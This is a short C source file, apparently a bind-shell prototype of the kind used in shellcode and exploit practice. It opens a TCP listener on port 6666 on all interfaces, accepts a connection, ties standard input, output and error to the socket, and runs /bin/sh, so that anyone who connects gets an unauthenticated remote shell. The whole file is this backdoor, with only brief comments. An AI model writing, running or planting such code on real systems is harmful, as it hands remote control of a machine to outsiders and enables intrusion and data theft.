#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define SHELL "/bin/sh"   // shell to execute
#define PORT 6666	//port number to connect

void main() {
	
    	int sockfd, new_sockfd;
    	struct sockaddr_in srv_addr;

    	srv_addr.sin_family = 2; // PF_INET
   	srv_addr.sin_port = htons(PORT);
   	srv_addr.sin_addr.s_addr = INADDR_ANY;

    	sockfd = socket(PF_INET, SOCK_STREAM, 6);
    	
	bind(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
       
    	listen(sockfd, 1);
       
        new_sockfd = accept(sockfd, NULL, NULL);

        dup2(new_sockfd, 0); //STDIN
        dup2(new_sockfd, 1); //STDOUT
        dup2(new_sockfd, 2); //STERR

        execve(SHELL, NULL, NULL);
}
